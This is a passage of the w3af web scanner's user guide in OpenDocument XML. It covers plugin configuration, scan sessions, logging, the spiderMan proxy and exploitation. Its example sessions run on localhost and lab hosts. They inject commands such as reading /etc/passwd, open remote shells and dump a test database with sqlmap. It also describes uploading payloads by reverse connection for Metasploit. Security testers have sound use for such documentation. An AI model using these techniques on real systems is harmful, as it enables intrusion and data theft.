      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">The extensions parameter is a comma separated list of extensions that this plugin will try to upload. Many web applications <text:s text:c="13"/>verify the extension of the file being uploaded, if special extensions are required, they can be added here.</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/></text:p>
      <text:p text:style-name="P44">Some web applications check the contents of the files being uploaded to see if they are really what their extension <text:s text:c="15"/>is telling. To bypass this check, this plugin uses file templates located at "plugins/audit/fileUpload/", this templates</text:p>
      <text:p text:style-name="P44">are valid files for each extension that have a section ( the comment field in a gif file for example ) that can be replaced</text:p>
      <text:p text:style-name="P27"><text:s text:c="5"/>by scripting code ( PHP, ASP, etc ).</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P44">After uploading the file, this plugin will try to find it on common directories like "upload" and "files" on every know directory. If the file is found, a vulnerability exists.</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P42">w3af/plugins&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P22">Now we know what this plugin does, but let's check their internals:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit config xss</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/xss&gt;&gt;&gt; </text:span>view</text:p>
      <text:p text:style-name="P44">Parameter <text:s text:c="10"/>Value <text:s text:c="14"/>Description</text:p>
      <text:p text:style-name="P44">========= <text:s text:c="10"/>===== <text:s text:c="14"/>===========</text:p>
      <text:p text:style-name="P44">checkPersistent <text:s text:c="4"/>True <text:s text:c="15"/>Search persistent XSS</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/xss&gt;&gt;&gt; </text:span>set checkPersistent False</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/xss&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit config sqli</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/sqli&gt;&gt;&gt; </text:span>view</text:p>
      <text:p text:style-name="P44">No configurable parameters.</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/sqli&gt;&gt;&gt; </text:span>back</text:p>
      <text:p text:style-name="P42">w3af/plugins&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P21"><text:s/></text:p>
      <text:p text:style-name="P22">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 it actually has no configurable parameters ).</text:p>
      <text:p text:style-name="P21"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>Starting a scan</text:h>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P22">After configuring all desired plugins the user has to set the target URL and finally start the scan. The target selection is done this way:</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> target</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt; </text:span>set target http://localhost/</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P42">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P21">Finally, you execute “start” and the process will start all plugins.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start</text:p>
      <text:p text:style-name="P21"/>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">A complete session</text:h>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P22">A complete w3af session would look like this ( see the inline comments ):</text:p>
      <text:p text:style-name="P21"/>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ity 10</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ity 0</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/console&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P21"><text:soft-page-break/></text:p>
      <text:p text:style-name="P22">All this previous commands have enabled two output plugins, console and textFile and configured them as needed.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> discovery allowedMethods,webSpider,error404page</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> discovery</text:p>
      <text:p text:style-name="P44">Enabled discovery plugins:</text:p>
      <text:p text:style-name="P44">webSpider</text:p>
      <text:p text:style-name="P44">allowedMethods</text:p>
      <text:p text:style-name="P44">error404page</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P22">In this case, we will be running only discovery plugins. The enabled plugins are allowedMethods,webSpider,error404page .</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> target</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span>set target http://localhost/w3af/</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span>back</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start</text:p>
      <text:p text:style-name="P44">New URL found by discovery: http://localhost/w3af/responseSplitting/responseSplitting.php</text:p>
      <text:p text:style-name="P44">New URL found by discovery: http://localhost/w3af/blindSqli/blindSqli-str.php</text:p>
      <text:p text:style-name="P44">New URL found by discovery: http://localhost/w3af/webSpider/2.html</text:p>
      <text:p text:style-name="P44">...</text:p>
      <text:p text:style-name="P44">...</text:p>
      <text:p text:style-name="P44">The URL: http://localhost/beef/hook/ has DAV methods enabled:</text:p>
      <text:p text:style-name="P44">- OPTIONS</text:p>
      <text:p text:style-name="P44">- GET</text:p>
      <text:p text:style-name="P44">- HEAD</text:p>
      <text:p text:style-name="P44">- POST</text:p>
      <text:p text:style-name="P44">- TRACE</text:p>
      <text:p text:style-name="P44"><text:soft-page-break/>- PROPFIND</text:p>
      <text:p text:style-name="P44">- PROPPATCH</text:p>
      <text:p text:style-name="P44">- COPY</text:p>
      <text:p text:style-name="P44">- MOVE</text:p>
      <text:p text:style-name="P44">- LOCK</text:p>
      <text:p text:style-name="P44">- UNLOCK</text:p>
      <text:p text:style-name="P44">- DELETE ( is possibly enabled too, not tested for safety )</text:p>
      <text:p text:style-name="P44">New URL found by discovery: http://localhost/w3af/globalRedirect/wargame/</text:p>
      <text:p text:style-name="P44">New URL found by discovery: http://localhost/w3af/globalRedirect/w3af-site.tgz</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P22">After the discovery phase is finished a summary is presented to the user:</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">The list of found URLs is:</text:p>
      <text:p text:style-name="P44">- http://localhost/w3af/globalRedirect/w3af.testsite.tgz</text:p>
      <text:p text:style-name="P44">- http://localhost/beef/hook/beefmagic.js.php</text:p>
      <text:p text:style-name="P44">- http://localhost/w3af/globalRedirect/2.php</text:p>
      <text:list text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P85">http://localhost/w3af/webSpider/11.html</text:p>
          <text:p text:style-name="P85">...</text:p>
          <text:p text:style-name="P85">...</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P22">A section of the summary is the points of injection that will be used in the audit phase:</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P44">Found 78 URLs and 102 different points of injection.</text:p>
      <text:p text:style-name="P44">The list of Fuzzable requests is:</text:p>
      <text:p text:style-name="P44">- http://localhost/w3af/ | Method: GET</text:p>
      <text:p text:style-name="P44">- http://localhost/w3af/responseSplitting/responseSplitting.php | Method: GET | Parameters: (header)</text:p>
      <text:list text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P88">http://localhost/w3af/sqli/dataReceptor.php | Method: POST | Parameters: (user,firstname)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P22">Finally the user exits the application, returning to the shell.</text:p>
      <text:p text:style-name="P21"/>
      <text:p text:style-name="P44"><text:soft-page-break/><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> exit</text:p>
      <text:p text:style-name="P44">w3af, better than the regular script kiddie.</text:p>
      <text:p text:style-name="P42">$</text:p>
      <text:p text:style-name="P27"/>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the internals. </text:p>
      <text:p text:style-name="Text_20_body">Some examples will make things clear: </text:p>
      <text:list text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P64">“You are testing an intranet web application, the web application is huge and doesn't use any macromedia flash or javascript code”. </text:p>
          <text:p text:style-name="P64"><text:span text:style-name="T1">Recommendation :</text:span> “discovery all,!spiderMan, !fingerGoogle, !fingerMSN, !fingerPKS, !MSNSpider, !googleSpider, !phishtank, !googleSafeBrowsing”.</text:p>
          <text:p text:style-name="P66">Reason: <text:span text:style-name="T2">Spiderman should only be used when webSpider can't find some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70"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P70">“You are testing a web application over the internet, the web application is huge and doesn't use any macromedia flash or javascript code”. </text:p>
          <text:p text:style-name="P70"><text:span text:style-name="T1">Recommendation</text:span> : “discovery all,!spiderMan, !wordnet , !googleSets”.</text:p>
          <text:p text:style-name="P66">Reason: <text:span text:style-name="T2">Spiderman should only be used when webSpider can't find some links. The wordnet and googleSets plugins are two plugins that take a long time to run over the internet so it's a good idea to disable them.</text:span></text:p>
          <text:p text:style-name="P70"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P70">“You are testing a web application over the internet, the web application is huge and has macromedia flash or javascript code. You also know that the application doesn't implement any web services”. </text:p>
          <text:p text:style-name="P70"><text:span text:style-name="T1">Recommendation</text:span> : “discovery all, !wordnet , !googleSets, !wsdlFinder”.</text:p>
          <text:p text:style-name="P66">Reason: <text:span text:style-name="T2">The wordnet and googleSets plugins are two plugins that take a </text:span><text:soft-page-break/><text:span text:style-name="T2">long time to run over the internet so it's a good idea to disable them. Regarding wsdlFinder, if we already know that no web services exist, why look for them using it ? .</text:span></text:p>
          <text:p text:style-name="P70"/>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P70">“You are testing a web application over the internet, the web application is huge, you really need to know all the links and functionality of the site and you don't care waiting.”. </text:p>
          <text:p text:style-name="P70"><text:span text:style-name="T1">Recommendation</text:span> : “discovery all” .</text:p>
          <text:p text:style-name="P66">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7">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7">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6">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ity 10</text:p>
      <text:p text:style-name="P39">back</text:p>
      <text:p text:style-name="P39"><text:soft-page-break/></text:p>
      <text:p text:style-name="P23">To run this script you would execute <text:span text:style-name="T4">“./w3af -s scripts/script-osCommanding.w3af” </text:span>, <text:s/>the output would look just like if you typed every command by hand in the console:</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P39"><text:span text:style-name="T3">$</text:span> ./w3af -s scripts/script-osCommanding.w3af</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> plugins</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit osCommanding</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> audit</text:p>
      <text:p text:style-name="P39">Enabled audit plugins:</text:p>
      <text:p text:style-name="P39">osCommanding</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> target</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span> set target http://localhost/w3af/osCommanding/vulnerable.php?command=f0as9</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start</text:p>
      <text:p text:style-name="P39">The list of found URLs is:</text:p>
      <text:p text:style-name="P39">- http://localhost/w3af/osCommanding/vulnerable.php</text:p>
      <text:p text:style-name="P39">Found 1 URLs and 1 different points of injection.</text:p>
      <text:p text:style-name="P39">The list of Fuzzable requests is:</text:p>
      <text:p text:style-name="P39">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)</text:p>
      <text:p text:style-name="P39">Starting osCommanding plugin execution.</text:p>
      <text:p text:style-name="P39">OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data sent was: command=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2.</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> exploit</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/exploit&gt;&gt;&gt;</text:span> exploit osCommandingShell</text:p>
      <text:p text:style-name="P39">osCommanding exploit plugin is starting.</text:p>
      <text:p text:style-name="P39">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.</text:p>
      <text:p text:style-name="P39">Vulnerability successfully exploited.</text:p>
      <text:p text:style-name="P39">Execute "exitPlugin" to get out of the remote shell. Commands <text:soft-page-break/>typed in this menu will be runned on the remote web server.</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:span> ls</text:p>
      <text:p text:style-name="P39">vulnerable.php</text:p>
      <text:p text:style-name="P39">vulnerable.php~</text:p>
      <text:p text:style-name="P42">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P42">w3af/exploit&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P42">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P39">Be a good boy and contribute with some lines of code.</text:p>
      <text:p text:style-name="P42">$</text:p>
      <text:p text:style-name="P42"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">The Output</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">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ity 10</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ity 0</text:p>
      <text:p text:style-name="P44"><text:span text:style-name="T3">w3af/plugin/console&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">This will configure the textFile plugin to output all messages, including the <text:soft-page-break/>debugging information ( see “<text:span text:style-name="T5">set verbosity 10” </text:span><text:span text:style-name="T7">) to the </text:span><text:span text:style-name="T5">“output-w3af.txt” </text:span><text:span text:style-name="T7">file. Here is an example of what is written to this file:</text:span></text:p>
      <text:p text:style-name="P38"/>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] Called _audit()</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - information ] Starting osCommanding plugin execution.</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] osCommanding plugin is testing: http://localhost/w3af/osCommanding/vulnerable.php</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] Threading is disabled.</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] GET http://localhost/w3af/osCommanding/vulnerable.php?command=%2Fbin%2Fcat+%2Fetc%2Fpasswd returned HTTP code "200"</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] Found the file echoed by the command.</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - vulnerability ] OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data se</text:p>
      <text:p text:style-name="P44">[ Tue May 15 14:14:49 2007 - debug ] Written session to disk. This is done only after 5 calls to save().</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P22">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1"/>
      <text:p text:style-name="P44">======Request 5 - Tue May 15 14:14:49 2007======</text:p>
      <text:p text:style-name="P44">GET http://localhost/w3af/osCommanding/vulnerable.php?command=ls HTTP/1.1</text:p>
      <text:p text:style-name="P44">Host: localhost</text:p>
      <text:p text:style-name="P44">Accept-encoding: identity</text:p>
      <text:p text:style-name="P44">Accept: */*</text:p>
      <text:p text:style-name="P44">User-agent: w3af.sourceforge.net</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">======Response 5 - Tue May 15 14:14:49 2007======</text:p>
      <text:p text:style-name="P44"><text:soft-page-break/>HTTP/1.1 200 OK</text:p>
      <text:p text:style-name="P44">date: Tue, 15 May 2007 17:14:49 GMT</text:p>
      <text:p text:style-name="P44">transfer-encoding: chunked</text:p>
      <text:p text:style-name="P44">x-powered-by: PHP/5.2.0-10</text:p>
      <text:p text:style-name="P44">content-type: text/html; charset=UTF-8</text:p>
      <text:p text:style-name="P44">server: Apache/2.2.3 (Debian) mod_python/3.2.10 Python/2.4.4 PHP/5.2.0-10 mod_perl/2.0.2 Perl/v5.8.8</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">asdljasndlansdlaknsdlaknsd</text:p>
      <text:p text:style-name="P44">vulnerable.php</text:p>
      <text:p text:style-name="P44">vulnerable.php~</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">asdajlsdkjalsdkj</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P44">======</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P22">Just in case you are wondering, all messages sent by the plugins and the framework are sent to ALL enabled plugins, so if you have enabled textFile and htmlFile output plugins, both will log a vulnerability found by an audit plugin.</text:p>
      <text:p text:style-name="P21"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Complex sites</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">Some sites use embedded objects, like macromedia flash and java applets, that the browser renders to the user. Because of the inability of the framework to get any information out of those objects, a script called spiderMan was born. This script will run a HTTP proxy so the user can navigate the target site through it; during this process the plugin will extract information from the requests and responses.</text:p>
      <text:p text:style-name="P36">A simple example will clarify things, let's suppose that w3af is auditing a site and can't find any links on the main page. After a closer interpretation of the results by the user, it is clear that the main page has a java applet menu where all the other pages are linked. The user runs w3af once again and now activates the spiderMan plugin, navigates the site manually using the browser and the spiderman proxy. When the user has finished his browsing, w3af will continue with all the hard auditing work.</text:p>
      <text:p text:style-name="P36">The spiderMan plugin can be used when javascript, flash, java applets or any <text:soft-page-break/>other browser side technology is present.</text:p>
      <text:p text:style-name="Text_20_body">This is a sample spiderMan plugin run:</text:p>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> plugins</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> discovery spiderMan</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> discovery</text:p>
      <text:p text:style-name="P39">Enabled discovery plugins:</text:p>
      <text:p text:style-name="P39">spiderMan</text:p>
      <text:p text:style-name="P39"><text:span text:style-name="T3">w3af/plugins&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P39"><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To exit spiderMan plugin please navigate to http://w3af/spiderMan?terminate or press ctrl+c .</text:p>
      <text:p text:style-name="P39">spiderMan running on 127.0.0.1:8998 .</text:p>
      <text:p text:style-name="P39">spiderMan plugin has been ended by user request.</text:p>
      <text:p text:style-name="P39"/>
      <text:p text:style-name="P23">Now the user configures the browser to use the 127.0.0.1:8998 proxy and navigates the target site, after that he hits ctrl+c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text:soft-page-break/>- http://localhost/w3af/</text:p>
      <text:p text:style-name="P39">- http://localhost/w3af/img/w3af.png</text:p>
      <text:p text:style-name="P39">- http://localhost/w3af/xss-forms/test-forms.html</text:p>
      <text:p text:style-name="P39">-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2">w3af&gt;&gt;&gt;</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Exploiting</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">Two ways of exploiting a vulnerability exist, the first one uses the vulnerabilities found by the audit phase and the second one requires the user to enter the vulnerability parameters, this way is called fastexploit, while the first one is just called exploit. </text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P36">Let's see an example of the first way of exploiting a vulnerability with w3af:</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P46"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start</text:p>
      <text:p text:style-name="P46">The list of found URLs is:</text:p>
      <text:p text:style-name="P46">- http://localhost/w3af/osCommanding/vulnerable.php</text:p>
      <text:p text:style-name="P46">Found 1 URLs and 1 different points of injection.</text:p>
      <text:p text:style-name="P46">The list of Fuzzable requests is:</text:p>
      <text:p text:style-name="P46">- http://localhost/w3af/osCommanding/vulnerable.php | Method: <text:soft-page-break/>GET | Parameters: (command)</text:p>
      <text:p text:style-name="P46">Starting osCommanding plugin execution.</text:p>
      <text:p text:style-name="P46">OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data sent was: command=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2.</text:p>
      <text:p text:style-name="P46"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> exploit</text:p>
      <text:p text:style-name="P46"><text:span text:style-name="T3">w3af/exploit&gt;&gt;&gt;</text:span> exploit osCommandingShell</text:p>
      <text:p text:style-name="P46">osCommanding exploit plugin is starting.</text:p>
      <text:p text:style-name="P46">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.</text:p>
      <text:p text:style-name="P46">Vulnerability successfully exploited.</text:p>
      <text:p text:style-name="P46">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.</text:p>
      <text:p text:style-name="P46"><text:span text:style-name="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:span> ls</text:p>
      <text:p text:style-name="P46">vulnerable.php</text:p>
      <text:p text:style-name="P46">vulnerable.php~</text:p>
      <text:p text:style-name="P43">w3af/exploit/osCommandingShell&gt;&gt;&gt; <text:span text:style-name="T9">whoami</text:span></text:p>
      <text:p text:style-name="P45">apache</text:p>
      <text:p text:style-name="P43">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P43">w3af/exploit&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P43">w3af&gt;&gt;&gt;</text:p>
      <text:p text:style-name="P43"/>
      <text:p text:style-name="P52">The second way is to use fastexploit. This method should be used when the user has found a vulnerability manually and wants to exploit it using the framework. Here is an example of a fastexploit run:</text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> exploit</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit&gt;&gt;&gt;</text:span> exploit config sqlmap</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/plugin/sqlmap&gt;&gt;&gt; </text:span>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</text:span> set injvar id</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</text:span> set data id=1</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</text:span> back</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit&gt;&gt;&gt;</text:span> fastexploit sqlmap</text:p>
      <text:p text:style-name="P49"><text:soft-page-break/>sqlmap coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch &lt;daniele.bellucci@gmail.com&gt;</text:p>
      <text:p text:style-name="P49">SQL injection could be verified, trying to create the DB driver.</text:p>
      <text:p text:style-name="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit/sqlmap&gt;&gt;&gt;</text:span> dump agenda w3af_test</text:p>
      <text:p text:style-name="P49">Database: w3af_test</text:p>
      <text:p text:style-name="P49">Table: agenda</text:p>
      <text:p text:style-name="P49">[2 entries]</text:p>
      <text:p text:style-name="P49">+---------------+----+--------+----------+-----------------+</text:p>
      <text:p text:style-name="P49">| direccion <text:s text:c="4"/>| id | nombre | telefono | email <text:s text:c="10"/>|</text:p>
      <text:p text:style-name="P49">+---------------+----+--------+----------+-----------------+</text:p>
      <text:p text:style-name="P49">| direccion 123 | 1 <text:s/>| apr <text:s text:c="3"/>| 52365786 | acho@c.com <text:s text:c="5"/>|</text:p>
      <text:p text:style-name="P49">| direccion 333 | 2 <text:s/>| vico <text:s text:c="2"/>| 47998123 | vTro@c.com <text:s text:c="5"/>|</text:p>
      <text:p text:style-name="P49">+---------------+----+--------+----------+-----------------+</text:p>
      <text:p text:style-name="P50">w3af/exploit/sqlmap&gt;&gt;&gt;</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Advanced exploiting techniques</text:h>
      <text:p text:style-name="P31"/>
      <text:p text:style-name="P32">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7">
        <text:list-item>
          <text:p text:style-name="P100">Virtual daemon, allows you <text:span text:style-name="T6">to use metasploit payloads to exploit the server that supports a vulnerable web application.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P100">w3afAgent, which creates a tunnel between the compromised server and w3af, the allow the user to route TCP connections through the remote server.</text:p>
          <text:p text:style-name="P100"/>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P32">Both of them are simple to use and configure using this guide. These features are under heavy development and are under no means stable, use them at your on risk.</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32"/>
      <text:h text:style-name="P35" text:outline-level="3"><text:soft-page-break/>Virtual daemon</text:h>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">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2">To be able to use the virtual daemon you will need to run the following command in order to copy the w3af metasploit module into the MSF directory:</text:p>
      <text:p text:style-name="P49">./w3af -i /home/jdoe/tools/msf/</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P34">Where “<text:span text:style-name="T4">/home/jdoe/tools/msf/</text:span><text:span text:style-name="T6">”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6">
        <text:list-item>
          <text:p text:style-name="P118">w3af finds a vulnerability that allows remote command execution</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">The user exploits the vulnerability and starts the virtual daemon</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">The user starts the metasploit framework</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">The user configures the w3af module inside MSF and executes it</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">w3af module inside MSF will connect to the virtual daemon that is listening on localhost</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">MSF will send the payload selected by the user to the virtual daemon</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P118">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18">The process of uploading the file to the remote server depends on the remote operating system, the privileges of the user running w3af and the local operating system; but in most cases the following happends:</text:p>
        </text:list-item>
      </text:list>
      <text:list text:style-name="L17">
        <text:list-item>
          <text:p text:style-name="P91">w3af sends a small executable to the remote server to perform an extrusion scan.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P91">w3af sniffs on the configured interface ( misc-settings -&gt; interface ) for packets that arrive on the expected ports in order to verify outgoing firewall rules on the remote network</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P93"><text:span text:style-name="T6">If a TCP port is found to be allowed in the remote firewall, w3af will try to run a server on that port and make a reverse connection from the </text:span>compromised host in order to download the PE/ELF generated file.<text:span text:style-name="T6"> If </text:span><text:soft-page-break/><text:span text:style-name="T6">no TCP ports are enabled, w3af will send the ELF/PE file to the remote server using several calls to the “echo” command, which is rather slow, but should always work because it's an in-band transfer method.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:list text:style-name="L16" text:continue-numbering="true">
        <text:list-item>
          <text:p text:style-name="P118"><text:s text:c="4"/>The payload runs in the remote server and possibly connects back to the metasploit framework, that will handle the rest of the exploitation.</text:p>
        </text:list-item>
      </text:list>
      <text:list text:style-name="L10">
        <text:list-header>
          <text:p text:style-name="P103"/>
        </text:list-header>
      </text:list>
      <text:p text:style-name="P32">Now that we know the theory, let's see an example of what this feature can do:</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">$</text:span> ./w3af </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> plugins </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6.1.128/os.php?cmd=f00 </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span> back </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start </text:p>
      <text:p text:style-name="P49">The list of found URLs is: </text:p>
      <text:p text:style-name="P49">- http://172.16.1.128/os.php </text:p>
      <text:p text:style-name="P49">Found 1 URLs and 1 different points of injection. </text:p>
      <text:p text:style-name="P49">The list of Fuzzable requests is: </text:p>
      <text:p text:style-name="P49">- http://172.16.1.128/os.php | Method: GET | Parameters: (cmd) </text:p>
      <text:p text:style-name="P49">Starting osCommanding plugin execution. </text:p>
      <text:p text:style-name="P49">OS Commanding was found at: http://172.16.1.128/os.php . Using method: GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The vulnerability was found in the request with id 7.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text:soft-page-break/>Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </text:p>
